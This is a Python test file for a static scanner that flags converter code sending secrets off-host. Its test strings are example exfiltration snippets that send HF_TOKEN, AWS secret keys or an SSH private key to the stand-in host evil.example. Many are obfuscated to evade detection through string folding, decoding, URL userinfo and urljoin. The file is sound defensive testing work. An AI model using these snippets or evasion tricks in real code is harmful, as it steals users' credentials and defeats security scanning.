        if hasattr(ast_module, name):
            removed[name] = getattr(ast_module, name)
            delattr(ast_module, name)
    try:
        module = _load(
            "converter_scan_no_match_probe", "unsloth_zoo/converter_scan.py",
        )
        assert module.MATCH_CAPTURES == ()
        assert module.scan_converter_source(
            'import os\nimport requests\n'
            'HUB = "https://huggingface.co"\n'
            'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
        ) == []
    finally:
        for name, value in removed.items():
            setattr(ast_module, name, value)


def test_a_descriptor_bound_to_a_name_is_still_that_method():
    """A method bound to a name is still that method: r = str.replace, then r(HUB, ...) rewrites the hub."""
    scan_converter_source = _load(
        "converter_scan_descriptor_alias_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    token = 'headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    for body in (
        'r = str.replace\n'
        'requests.get(r(HUB, "huggingface.co", "evil.example"), ' + token,
        'f = str.format\n'
        'requests.get(f("{}://{}", "https", "evil.example"), ' + token,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    assert scan_converter_source(preamble + 'requests.get(HUB, ' + token) == []


def test_a_bytes_environment_read_and_a_called_plus_are_read():
    """os.getenvb of AWS_SECRET_ACCESS_KEY is the same read as os.getenv on Unix; exempting it left
    the collected set holding only the hub token while a hub GET carried both values"""
    module = _load(
        "converter_scan_getenvb_probe", "unsloth_zoo/converter_scan.py",
    )
    scan_converter_source = module.scan_converter_source

    # A bytes key is attributed by name, since the allowance turns on which names are read.
    import ast as ast_module
    assert module._env_reads(
        ast_module.parse('import os\nx = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n')
    ) == ({"AWS_SECRET_ACCESS_KEY"}, False)
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    both = 'headers = {"a": os.environ["HF_TOKEN"], "b": other})\n'
    send = 'requests.get(url, headers = {"a": os.environ["HF_TOKEN"]})\n'
    for body in (
        'other = os.getenvb(b"AWS_SECRET_ACCESS_KEY")\n'
        'requests.get(HUB, ' + both,
        'import operator\n'
        'url = operator.add("https", "://evil.example/c")\n' + send,
        'url = "https".__add__("://evil.example/c")\n' + send,
        'url = str.__add__("https", "://evil.example/c")\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # mod, mul, in-place names and dunders are folded by calling the operator, not repeating its
    # rules.
    for body in (
        'import operator\n'
        'url = operator.mod("%s://%s/c", ("https", "evil.example"))\n' + send,
        'from operator import mod\n'
        'url = mod("%s://%s/c", ("https", "evil.example"))\n' + send,
        'import operator\n'
        'url = operator.mul("https", 1) + "://evil.example/c"\n' + send,
        'url = "%s://%s/c".__mod__(("https", "evil.example"))\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body
    # The hub through the same call is still the hub.
    assert scan_converter_source(
        preamble + 'import operator\nurl = operator.mod("%s/api", HUB)\n' + send
    ) == []

    # operator.add, however named, is refused; set.add is not, since it takes one argument.
    for body in (
        'from operator import add\nurl = add("https", "://evil.example/c")\n'
        + send,
        'from operator import add as a\nurl = a("https", "://evil.example/c")\n'
        + send,
        'import operator\na = operator.add\n'
        'url = a("https", "://evil.example/c")\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body
    assert scan_converter_source(
        preamble + 'seen = set()\nseen.add("x")\nurl = f"{HUB}/api"\n' + send
    ) == []

    # The hub token read the same way is the read this allowance is for.
    assert scan_converter_source(
        preamble + 'token = os.getenvb(b"HF_TOKEN")\n'
        + 'requests.get(HUB, headers = {"a": token})\n'
    ) == []


def test_two_scans_at_once_do_not_share_one_budget():
    """The fold budget was a module global, so concurrent exports shared a counter and cleared it early."""
    import threading

    module = _load(
        "converter_scan_threaded_probe", "unsloth_zoo/converter_scan.py",
    )
    clean = (
        'import os\nimport requests\n'
        'HUB = "https://huggingface.co"\n'
        'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
    )
    module._fold_state.budget = 4_096
    # The charge reads per-thread state, so the budget is per decision, not per process.
    try:
        module._charge_fold("x" * 4_097)
    except module._FoldBudgetExceeded:
        pass
    else:
        raise AssertionError("the charge did not read this thread's budget")

    module._fold_state.budget = 4_096
    verdicts = []
    thread = threading.Thread(
        target = lambda: verdicts.append(module.scan_converter_source(clean)),
    )
    thread.start()
    thread.join()
    assert verdicts == [[]]
    assert module._fold_state.budget == 4_096
    del module._fold_state.budget


def test_a_decoded_literal_and_a_scheme_built_a_character_at_a_time():
    """UTF-16 attacker URL bytes read as UTF-8 leave no host spelled in the file, so literal
    decoding is now refused outright."""
    scan_converter_source = _load(
        "converter_scan_decode_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    send = (
        'requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    )
    encoded = repr("https://evil.example/c".encode("utf-16"))
    for body in (
        f'url = {encoded}.decode("utf-16")\n' + send,
        'url = "%cttps://evil.example/c" % 104\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # And a literal taken apart is put back together the same way:
    for body in (
        'parts = "https|://evil.example/c".split("|")\n'
        'url = parts[0] + parts[1]\n' + send,
        'a, _, b = "https|://evil.example/c".partition("|")\nurl = a + b\n'
        + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # Splitting the download is ordinary, and it is not a literal.
    assert scan_converter_source(
        preamble + 'url = f"{HUB}/api"\n'
        + 'lines = requests.get(url).text.split("\\n")\n' + send
    ) == []

    # Decoding the download is what upstream does, and the hub URL beside it is still the hub.
    assert scan_converter_source(
        preamble + 'url = f"{HUB}/api"\n'
        + 'raw = requests.get(url).content.decode()\n' + send
    ) == []


def test_a_literal_transformed_by_any_unreadable_method_refuses_it():
    """Named methods were gaps: replace with dynamic args, decode of UTF-16 bytes, split indexed
    back together, and ljust(6, colon) turning https into a scheme."""
    scan_converter_source = _load(
        "converter_scan_any_method_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
    send = (
        'requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    )
    for body in (
        'url = "https".ljust(6, ":") + "//evil.example/c"\n' + send,
        'url = "ttps://evil.example/c".rjust(23, "h")\n' + send,
        'url = "HTTPS://EVIL.EXAMPLE/c".lower()\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    # The constructors spell the same transformation with no method in sight.
    payload = repr("https://evil.example/c".encode("utf-16le"))
    for body in (
        f'url = str({payload}, "utf-16le")\n' + send,
        'url = bytes("https://evil.example/c", "utf-8").decode()\n' + send,
    ):
        assert [f.check for f in scan_converter_source(preamble + body)], body

    for body in (
        'url = "{}/api".format(HUB)\n' + send,
        'url = f"{HUB}/api/" + str(model_id)\n' + send,
        'url = HUB + "/api"\nname = base.replace(" ", "-")\n' + send,
    ):
        assert scan_converter_source(preamble + body) == [], body


def test_a_token_sent_over_plaintext_refuses_the_hub_allowance():
    """The hub host over plain http sends the token where anyone on the path can read it."""
    scan_converter_source = _load(
        "converter_scan_plaintext_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source
    assert [
        f.check for f in scan_converter_source(
            'import os\nimport requests\n'
            'requests.get("http://huggingface.co",'
            ' headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
        )
    ]
    assert scan_converter_source(
        'import os\nimport requests\n'
        'requests.get("https://huggingface.co",'
        ' headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
    ) == []


def test_the_hub_narrowing_does_not_reach_any_other_rule():
    """Only the env-harvest combination is narrowed."""
    scan_converter_source = _load(
        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    creds = (
        'import requests\n'
        'BASE_DOMAIN = "https://huggingface.co"\n'
        'data = open("/root/.ssh/id_rsa").read()\n'
        'requests.post(BASE_DOMAIN, data = data)\n'
    )
    assert any("credential paths" in f.check for f in scan_converter_source(creds)), (
        [f.check for f in scan_converter_source(creds)]
    )


def test_the_hub_allowance_reads_the_real_hostname():
    """Reads only: a hub write is refused outright, so a POST would pass without the hostname check."""
    scan_converter_source = _load(
        "converter_scan_hub_probe", "unsloth_zoo/converter_scan.py",
    ).scan_converter_source

    def _findings(url):
        return [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                f'URL = "{url}"\n'
                'requests.get(URL, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
            )
        ]

    assert _findings("https://huggingface.co:443@evil.example/collect"), (
        "userinfo before the @ must not stand in for the hostname"
    )
    # A host that merely starts with the hub's name is a different host.
    assert _findings("https://huggingface.co.evil.example/collect")
    # A URL with no host at all names no destination, so nothing is suppressed.
    assert _findings("https:///collect")
    # Hostless URLs must still count beside a hub link, or one could hide behind it in the file.
    assert [
        f.check for f in scan_converter_source(
            'import os\n'
            'import requests\n'
            'HUB = "https://huggingface.co/api/models"\n'
            'OUT = "https:///collect"\n'
            'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
        )
    ]

    # requests normalizes HTTPS://, so the scheme match must not be lowercase-only.
    def _beside_the_hub(destination):
        return [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                'HUB = "https://huggingface.co/api/models"\n'
                f'OUT = {destination}\n'
                'requests.get(OUT, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
            )
        ]

    assert _beside_the_hub('"HTTPS://evil.example/collect"')
    assert _beside_the_hub('"HtTpS://evil.example/collect"')
    assert _beside_the_hub('"https://evil.example/collect"')
    assert _beside_the_hub('"https://huggingface.co/api/models"') == []

    # The shapes that really are the hub still pass, port and case included.
    assert _findings("https://huggingface.co/api/models") == []
    assert _findings("https://huggingface.co:443/api/models") == []
    assert _findings("https://HuggingFace.CO/api/models") == []

    # Bytes literals are URLs too; requests accepts b"https://...", so they must be read.
    assert _beside_the_hub('b"https://evil.example/collect"')

    # A backslash is part of the URL, not a place to stop reading it.
    for separator in (chr(92), " ", chr(9), chr(10), "%20"):
        assert _beside_the_hub(
            '"https://huggingface.co' + separator + '@evil.example/collect"'
        ), f"a {separator!r} in the authority must refuse the allowance"

    # ast.parse folds neither + nor %: an evil.example URL split across operands named no host, so a
    # hub literal elsewhere granted it the allowance.
    assert _beside_the_hub('"https://" + "evil.example/collect"')
    assert _beside_the_hub('"htt" + "ps://evil.example/collect"')
    assert _beside_the_hub('"https://" + "evil.example" + "/collect"')
    assert _beside_the_hub('b"https://" + b"evil.example/collect"')
    assert _beside_the_hub('"%s://%s/collect" % ("https", "evil.example")')
    assert _beside_the_hub('"https://%s/collect" % ("evil.example",)')

    # The hub spelled the same way is still the hub.
    assert _beside_the_hub('"https://huggingface.co" + "/api/models"') == []
    assert _beside_the_hub('"https://hugging" + "face.co/api/models"') == []
    assert _beside_the_hub('"%s/api/models" % ("https://huggingface.co",)') == []

    # Only %s, %r and %% are folded:
    assert _beside_the_hub('"%2000000000d" % 1') == []

    # An f-string arrives split: an empty {''} is a no-op, so the scheme and host sit in two pieces.
    assert _beside_the_hub("f\"https://{''}evil.example/collect\"")
    assert _beside_the_hub('f"https://{SEP}evil.example/collect"')
    assert _beside_the_hub('f"https://{org}.huggingface.co/api/models"')

    # The f-string https://huggingface.co{SUFFIX} with SUFFIX @evil.example/collect fetches
    # evil.example (text before the @ is userinfo); a walk reading its pieces separately sees
    # huggingface.co and allows it
    assert _beside_the_hub('f"https://huggingface.co{SUFFIX}"')
    assert _beside_the_hub("f\"https://huggingface.co{'@evil.example/collect'}\"")
    assert _beside_the_hub('f"https://huggingface.co{tld}/api/models"')

    # A scheme with no authority means the destination is assembled where this cannot follow.
    assert _beside_the_hub('"".join(("https://", "evil.example")) + "/collect"')
    assert _beside_the_hub('"{}evil.example/collect".format("https://")')
    assert _beside_the_hub('"https://"')

    # A literal reaches the request only unreshaped; BASE.replace(...) turns the hub into
    # evil.example.
    def _reshaped(body):
        return [
            f.check for f in scan_converter_source(
                'import os\n'
                'import requests\n'
                'BASE = "https://huggingface.co"\n'
                + body
                + 'requests.get(url, params = {"leak": os.environ["HF_TOKEN"]})\n'
            )
        ]

    assert _reshaped('url = BASE.replace("huggingface.co", "evil.example")\n')
    assert _reshaped('url = "https://huggingface.co"[:8] + "evil.example"\n')
    assert _reshaped('url = BASE[:8] + "evil.example"\n')
    # The same reshape through an intermediate string or a walrus assignment is still refused.
    assert _reshaped(
        'u = f"{BASE}"\nurl = u.replace("huggingface.co", "evil.example")\n'
    )
    assert _reshaped(
        'url = (u := BASE).replace("huggingface.co", "evil.example")\n'
    )
    # str.join was the last construction the folding missed; it beat both checks above.
    assert _beside_the_hub('"".join(("htt", "ps://ev", "il.exa", "mple/collect"))')
    # str.format is FOLDED, not refused: upstream spells strings with it on 15 literal receivers.
    assert _beside_the_hub('"{}://{}".format("https", "evil.example/collect")')
    assert _beside_the_hub('"{s}://{h}/c".format(s = "https", h = "evil.example")')
    assert _beside_the_hub(
        '"{a}://{b}".format_map({"a": "https", "b": "evil.example"})'
    )
    assert _beside_the_hub('"{}://{}".format("https", "huggingface.co")') == []
    assert _beside_the_hub('"".join([x, "htt", "ps://evil.example/collect"])')
    # The hole has to stay in the text.
    assert _beside_the_hub('"".join(["https://huggingface.co", SUFFIX])')
    assert _beside_the_hub('"/".join(["https:/", "evil.example", "collect"])')
    # A carrier put through a join comes out untainted, so reshaping the result must be caught too.
    assert _reshaped('url = "".join([BASE, "/x"]).replace("huggingface.co", "evil.example")\n')
    # += mutates the carrier in place and the walk still sees only the hub it
    # started as, while at runtime the authority resolves to evil.example.
    assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
    # Appending to a carrier can rewrite the authority without touching the literal:
    assert _reshaped('url = urljoin(BASE, "//evil.example/collect")\n')
    assert _reshaped(
        'import urllib.parse\nurl = urllib.parse.urljoin(BASE, "//evil.example/c")\n'
    )
    assert _reshaped(
        'from urllib.parse import urlparse\n'
        'assert urlparse(BASE).scheme == "https"\nurl = BASE\n'
    ) == []
    assert _reshaped('url = BASE + "@evil.example/collect"\n')
    assert _reshaped('url = f"{BASE}@evil.example/collect"\n')
    assert _reshaped('url = BASE + ".evil.example/collect"\n')
    assert _reshaped('url = BASE + suffix\n')
    assert _reshaped('url = BASE + "/api/models"\n') == []
    assert _reshaped('url = BASE + "?full=true"\n') == []
    assert _reshaped('url = f"{BASE}/api/{name}"\n') == []
    # Unpacking or attribute targets can bind a carrier; reading only bare Names lost it.
    assert _reshaped(
        'B, = ("https://huggingface.co",)\n'
        'url = B.replace("huggingface.co", "evil.example")\n'
    )
    assert _reshaped(
        '[B] = ["https://huggingface.co"]\nurl = B[:8] + "evil.example"\n'
    )
    assert _reshaped(
        'class C: pass\n'
        'C.B = "https://huggingface.co"\n'
        'url = C.B.replace("huggingface.co", "evil.example")\n'
    )
    # A dictionary lookup reads the value out, so a carrier passes through it; a benign dictionary
    # of hub URLs stays readable.
    assert _reshaped(
        'URLS = {"hub": "https://huggingface.co"}\n'
        'url = URLS["hub"].replace("huggingface.co", "evil.example")\n'
    )
    assert _reshaped(
        'URLS = {"hub": "https://huggingface.co"}\nurl = URLS["hub"]\n'
    ) == []
    # Unpacking hub URLs and using one as written is not a reshape.
    assert _reshaped(
        'A, url = ("https://huggingface.co/api", "https://huggingface.co")\n'
    ) == []

    # An element that folds to "" is a fold, not a hole:
    assert _beside_the_hub('"".join(("https://huggingface.co", ""))') == []
    assert _reshaped('url = f"{BASE}"[:8] + "evil.example"\n')
    # Joining the hub with its own path is still the hub.
    assert _beside_the_hub('"/".join(("https://huggingface.co", "api", "models"))') == []
    assert _beside_the_hub('"".join(("https://", "huggingface.co", "/api"))') == []

    # Settling which names carry a URL is bounded.
    chain = "".join(
        f'v{i} = f"{{v{i - 1}}}/x"\n' for i in range(1500)
    ).replace("{v-1}", "{BASE}")
    # A fixpoint that does not settle within its passes refuses, so a runaway walk flips the
    # verdict.
    assert _reshaped(chain + 'url = v1499.replace("huggingface.co", "evil.example")\n')

    # The assignments are collected once, not walked again per pass, so a long chain stays fast.
    long_chain = 'v0 = BASE\n' + "".join(
        f'v{i} = v{i - 1} + "/x"\n' for i in range(1, 10_000)
    )
    # The time bound is generous on purpose: it catches a return to walking the tree per pass.
    started = time.perf_counter()
    _reshaped(long_chain)
    assert time.perf_counter() - started < 60

    # What comes BACK from the hub is not a URL.
    assert scan_converter_source(
        'import os\n'
        'import requests\n'
        'BASE = "https://huggingface.co"\n'
        'url = f"{BASE}/api/models"\n'
        'r = requests.get(url, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
        'r.raise_for_status()\n'
        'head = r.content[:8]\n'
    ) == []

    # An f-string of the hub is still the hub, including upstream f"{BASE_DOMAIN}/{path}" and a BASE_DOMAIN with no trailing path.
    assert _beside_the_hub('f"https://huggingface.co/api/models/{name}"') == []
    assert _beside_the_hub('f"{HUB}/api/models"') == []
    assert _beside_the_hub('"https://huggingface.co"') == []
